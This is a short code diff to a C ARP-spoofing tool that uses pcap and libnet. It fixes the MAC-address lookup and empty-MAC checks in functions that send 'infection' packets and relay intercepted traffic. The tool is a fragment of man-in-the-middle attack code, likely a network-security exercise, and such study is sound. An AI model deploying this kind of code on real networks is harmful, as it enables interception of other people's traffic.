@@ -81,7 +81,7 @@ void get_target_mac_from_arp_table(uint8_t* dst, const uint8_t* packet, addr_pai
     memcpy(&i, &packet[LIBNET_ETH_H], LIBNET_IPV4_H);
 
     for(int i = 0; i < table_size; i++) {
-        if( !memcmp(e.ether_dhost, &address_table[i], MAC_SIZE) ) {
+        if( !memcmp(e.ether_shost, address_table[i].sdr_mac, MAC_SIZE) ) {
             memcpy(dst, address_table[i].tgt_mac, MAC_SIZE);
             return;
         }
@@ -171,7 +171,7 @@ void send_infection_packet(pcap_t* handle, const uint8_t* packet, arp_packet* ar
     get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
     if( !strlen((char*)target_mac) ) return;  // continue if the sender was not in our table
 
-    printf("Hello!\n");
+
 
     int i = get_session_location(target_mac, address_table, session_size);
     for(int cnt = 0; cnt < 3; cnt++) // send packet three times
@@ -190,7 +190,10 @@ void send_relay_packet(pcap_t* handle, const uint8_t* packet, addr_pair* address
     GetSvrMACAddress(my_mac);
     get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
 
-    if( !strlen((char*)target_mac) ) return;  // return if that target mac was not in arp table
+    uint8_t empty_mac[MAC_SIZE] = {0, };
+    if( !memcmp(target_mac, empty_mac, MAC_SIZE) ) return;  // return if that target mac was not in arp table
+
+    printf("target_mac : %.2X %.2X %.2X %.2X %.2X %.2X\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
 
     set_relay_packet(packet, target_mac, my_mac);
     if( pcap_sendpacket(handle, packet, packet_size)) {
